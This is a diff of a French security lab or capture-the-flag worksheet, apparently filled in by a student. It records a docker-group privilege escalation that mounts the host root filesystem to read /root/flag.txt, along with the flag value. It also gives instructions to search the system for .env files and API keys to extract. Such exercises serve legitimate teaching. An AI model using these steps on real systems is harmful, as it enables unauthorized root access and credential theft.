@@ -347,11 +347,12 @@ ssh prenom@4.233.139.22
 
 **7.1.** Vérifiez vos droits actuels. Pouvez-vous lire `/root/flag.txt` ?
 
-> **Résultat de la commande :**
+> **Résultat de la commande : Permission denied**
 
 **7.2.** Vérifiez vos groupes. Que remarquez-vous ?
 
-> **Groupes de votre utilisateur :**
+
+> **Groupes de votre utilisateur : Je suis dans le groupe docker avec comme nom thomas docker**
 
 **7.3.** Trouvez un moyen d'exploiter votre appartenance au groupe `docker` pour accéder aux fichiers root.
 
@@ -359,10 +360,11 @@ ssh prenom@4.233.139.22
 
 > **Commande docker utilisée pour accéder à `/root/flag.txt` :**
 > ```
->
+>docker run -v /:/host alpine cat host/root/flag.txt
 > ```
 >
 > **Contenu de `/root/flag.txt` :**
+FLAG=3
 
 **7.4.** Scannez (avec `find -f` les fichiers qui pourraient être intéressants pour un acteur malveillant : `.env`, par exemple)
 Vous pouvez aussi scanner tous les fichiers du systeme, et filtrer avec `grep` des choses comme `API_KEY` et l'extraire
